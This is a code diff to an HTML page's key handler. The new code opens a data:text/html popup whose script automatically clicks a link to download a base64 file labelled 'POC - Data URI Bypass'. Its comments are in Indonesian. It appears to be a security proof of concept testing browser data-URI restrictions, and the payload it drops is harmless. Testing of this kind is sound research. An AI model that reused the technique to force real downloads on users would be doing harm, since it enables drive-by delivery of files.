@@ -16,8 +16,30 @@
     <script>
         document.addEventListener("keydown", (e) => {
             if (e.key === "Enter") {
-                console.log("Executing Blob-Escape Strategy...");
-                window.open("data:text/html,<script>alert(1)<\/script>");
+                console.log("Triggering Data-URI Escape...");
+                const payload = `
+            <html>
+            <body>
+                <h1>Data URI Context</h1>
+                <script>
+                    try {
+                        const a = document.createElement("a");
+                        // File palsu untuk ngetes download
+                        a.href = "data:application/octet-stream;base64,UE9DIC0gRGF0YSBVUkkgQnlwYXNz";
+                        a.download = "data_uri_bypass.txt";
+                        document.body.appendChild(a);
+                        a.click();
+                        console.log("Download triggered in Data URI context");
+                    } catch (err) {
+                        console.error("Failed:", err.message);
+                    }
+                    // Jangan langsung tutup biar bisa cek console popup-nya
+                    setTimeout(() => { /* window.close(); */ }, 5000);
+                <\/script>
+            </body>
+            </html>
+        `.replace(/\n/g, "");
+                window.open("data:text/html," + encodeURIComponent(payload), "_blank", "width=400,height=300");
             }
         });
     </script>
